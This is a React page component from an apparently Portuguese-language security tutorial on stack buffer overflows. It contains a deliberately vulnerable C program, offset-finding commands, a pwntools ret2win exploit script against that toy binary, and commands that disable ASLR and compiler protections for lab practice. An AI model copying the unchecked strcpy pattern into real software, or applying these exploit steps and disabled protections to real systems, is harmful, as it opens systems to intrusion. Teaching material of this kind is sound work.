import { PageContainer } from "@/components/layout/PageContainer";
import { CodeBlock } from "@/components/ui/CodeBlock";
import { AlertBox } from "@/components/ui/AlertBox";

export default function BufferOverflow() {
  return (
    <PageContainer title="Buffer Overflow" subtitle="Como buffers estouram e sobrescrevem o endereço de retorno" difficulty="expert" timeToRead="25 min">
      <AlertBox type="danger" title="Uso Educacional">
        Este conteúdo é exclusivamente para fins educacionais e pesquisa de segurança. Explorar vulnerabilidades sem autorização é ilegal. Use apenas em ambientes de CTF, VMs de laboratório ou sistemas que você possui.
      </AlertBox>

      <p>Buffer overflow é uma das vulnerabilidades mais antigas e mais exploradas. Acontece quando dados são escritos além dos limites de um buffer, sobrescrevendo dados adjacentes na memória — incluindo o endereço de retorno.</p>

      <h2>A Vulnerabilidade</h2>
      <CodeBlock language="c" filename="vuln.c" code={`// Programa vulnerável:
#include <stdio.h>
#include <string.h>

void funcao_secreta() {
    printf("Você nunca deveria chegar aqui!\\n");
    // system("/bin/sh");  // em exploits reais
}

void vulneravel(char *input) {
    char buffer[64];        // buffer de 64 bytes
    strcpy(buffer, input);  // VULNERÁVEL: não verifica tamanho!
}

int main(int argc, char *argv[]) {
    vulneravel(argv[1]);
    return 0;
}

// Compilar sem proteções (para laboratório):
// gcc -o vuln vuln.c -fno-stack-protector -z execstack -no-pie`} />

      <h2>A Stack Durante a Execução</h2>
      <CodeBlock language="bash" code={`# Stack frame de vulneravel() com input = "AAAA...":
# Endereços crescentes ↑
#
# [rbp + 8]   = endereço de retorno para main  ← alvo!
# [rbp + 0]   = rbp salvo
# [rbp - 8]   = (possível canary)
# [rbp - 72]  = buffer[63]  → último byte do buffer
# [rbp - 72]  = buffer[0]   ← strcpy começa aqui
#
# Se input tem 73+ bytes, estoura o buffer e sobrescreve rbp
# Se input tem 81+ bytes, sobrescreve o endereço de retorno!`} />

      <h2>Encontrando o Offset</h2>
      <CodeBlock language="bash" code={`# Usar padrão de bytes únicos para encontrar o offset:
python3 -c "import sys; sys.stdout.buffer.write(b'A'*64 + b'B'*8 + b'C'*8)" > payload.bin
./vuln $(cat payload.bin)
# Olhar no GDB: quando RIP = 0x4343434343434343, o offset é 72 bytes

# Com pwntools:
python3 << 'EOF'
from pwn import *
p = cyclic(200)  # gera padrão único de 200 bytes
print(p)
EOF
./vuln $(python3 -c "from pwn import *; print(cyclic(200).decode())")
# No GDB: p cyclic_find(rip_value)  → encontra o offset`} />

      <h2>Exploit Básico (ret2win)</h2>
      <CodeBlock language="python" filename="exploit.py" code={`#!/usr/bin/env python3
# exploit.py — ret2win: redirecionar para funcao_secreta()
from pwn import *

# Configurar
elf = ELF('./vuln')
p = process('./vuln')

# Endereço da função "secreta"
target = elf.symbols['funcao_secreta']
print(f"[*] Endereço alvo: {hex(target)}")

# Payload: 72 bytes de padding + endereço alvo
offset = 72
payload = b'A' * offset
payload += p64(target)  # substitui endereço de retorno

# Enviar
p.sendline(payload)
p.interactive()`} />

      <h2>Proteções e Como Funcionam</h2>
      <CodeBlock language="bash" code={`# ASLR — Address Space Layout Randomization:
# Randomiza endereços de stack, heap e bibliotecas
cat /proc/sys/kernel/randomize_va_space  # 2 = ASLR completo
# Bypass: informação de leak, ret2libc, heap spray

# NX (No-Execute) / DEP:
# Stack e heap não são executáveis — shellcode na stack não funciona
# Bypass: ROP (Return Oriented Programming)

# Stack Canary:
# Valor aleatório entre buffer e endereço de retorno
# Verificado antes do RET — se mudou, programa termina
# Bypass: leak do canary, format string

# PIE — Position Independent Executable:
# O executável em si é randomizado (não só bibliotecas)
# Bypass: leak de endereço do binário

# Full RELRO:
# GOT somente leitura — não pode sobrescrever ponteiros de função
# Bypass: técnicas avançadas`} />

      <h2>Desabilitando Proteções (laboratório)</h2>
      <CodeBlock language="bash" code={`# Para praticar em laboratório:
# Desabilitar ASLR:
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space

# Compilar sem proteções:
gcc -o vuln vuln.c \\
    -fno-stack-protector \\  # sem canary
    -z execstack \\           # stack executável
    -no-pie \\               # sem PIE
    -D_FORTIFY_SOURCE=0      # sem fortify

# Verificar:
checksec --file=vuln
# Resultado desejado: No RELRO, No canary, NX disabled, No PIE`} />
    </PageContainer>
  );
}
